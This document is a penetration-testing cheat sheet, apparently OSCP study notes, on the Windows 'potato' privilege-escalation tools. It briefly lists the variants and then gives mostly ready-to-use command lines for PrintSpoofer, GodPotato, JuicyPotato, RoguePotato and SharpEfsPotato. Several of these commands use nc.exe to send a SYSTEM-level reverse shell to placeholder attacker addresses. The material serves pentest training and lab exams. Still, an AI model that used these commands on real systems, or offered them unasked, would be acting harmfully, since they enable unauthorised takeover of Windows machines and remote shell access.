## Summary
https://github.com/AtvikSecurity/CentralizedPotatoes

The "potato" family of privilege escalation attacks on Windows was started with the introduction of Hot Potato in 2016. These attacks typically exploit authentication mechanisms, credentials, and services with impersonation privileges to elevate from a service account to system level access.

Almost every one of the potatoes target a different component of Windows to take advantage of the 𝑆𝑒𝐼𝑚𝑝𝑒𝑟𝑠𝑜𝑛𝑎𝑡𝑒𝑃𝑟𝑖𝑣𝑖𝑙𝑒𝑔𝑒 or 𝑆𝑒𝐴𝑠𝑠𝑖𝑔𝑛𝑃𝑟𝑖𝑚𝑎𝑟𝑦𝑇𝑜𝑘𝑒𝑛𝑃𝑟𝑖𝑣𝑖𝑙𝑒𝑔𝑒 permissions.

Here are all the popular potatoes in chronological order from oldest (1) to newest (9):
```
Hot Potato - NTLM relay (HTTP->SMB relay) and NBNS spoofing
Rotten Potato - Windows Service Accounts
Juicy Potato - Windows Service Accounts
Lonely Potato - DCOM (Distributed Component Object Model)
Rogue Potato - RPC over custom ports
Sweet Potato - Print Spooler
Generic Potato - HTTP and named pipes
SharpEfsPotato - EfsRpc
God Potato - DCOM (Distributed Component Object Model)
Local Potato - NTLM authentication challenge process
```

## Usage

For OSCP Purposes, we will probably only use PrintSpoofer, GodPotato, or JuicyPotato...

Get .NET version
```powershell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

Check `systeminfo` to verify x64 vs x86
	32 bit version (x86) -- https://github.com/ivanitlearning/Juicy-Potato-x86

For older windows boxes, use JuicyPotato
	windows 2008, 7, etc...
	CSLIDs found here -- https://github.com/ohpe/juicy-potato/tree/master/CLSID
		LocalService 'wuauserv' is usually a good choice

Potatoes Usage
```powershell
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

#GodPotato -- check .NET version first
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c shell.exe"
GodPotato.exe -cmd "cmd.exe /c C:\Users\Public\nc.exe -e cmd.exe $host $port"

# For JuicyPotato, use -c ONLY if default gives you a 10038 error

#JuicyPotatoNG (x64)
JuicyPotatoNG.exe -t * -p "shell.exe" -a
JuicyPotatoNG.exe -l <any_listen_port> -p c:\windows\system32\cmd.exe -a "/c c:\path\to\nc.exe -e cmd.exe <our_ip> <our_listen_port>" -t * (-c {CLSID})

#JuicyPotatox86
JuicyPotatox86.exe -t * -p "shell.exe" -a
JuicyPotatox86.exe -l <any_listen_port> -p c:\windows\system32\cmd.exe -a "/c c:\path\to\nc.exe -e cmd.exe <our_ip> <our_listen_port>" -t * (-c {CLSID})
```

Potential Future Usage
```powershell
#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
#writes whoami command to w.log file
```